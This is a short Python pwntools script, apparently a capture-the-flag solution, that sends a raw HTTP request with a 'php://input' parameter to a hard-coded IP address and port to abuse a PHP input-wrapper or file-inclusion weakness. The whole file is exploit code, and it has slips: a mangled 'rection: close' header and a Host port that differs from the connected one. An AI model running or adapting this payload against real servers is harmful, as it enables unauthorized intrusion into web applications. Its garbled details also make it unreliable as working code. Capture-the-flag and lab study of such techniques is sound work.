from pwn import *

def exploit():
    r = remote("124.16.75.117", 51013)
    
    # 构造完整的HTTP请求（注意使用b前缀表示bytes）
    http_request = b"GET /?a=&0=php://input HTTP/1.1\r\n"
    http_request += b"Host: 124.16.75.117:51003\r\n"
    http_request += b"rection: close\r\n"
    http_request += b"\r\n"  # 空行结束头部
    
    r.send(http_request)
    response = r.recvall()
    print(response.decode('utf-8', errors='ignore'))
    r.close()

if __name__ == "__main__":
    exploit()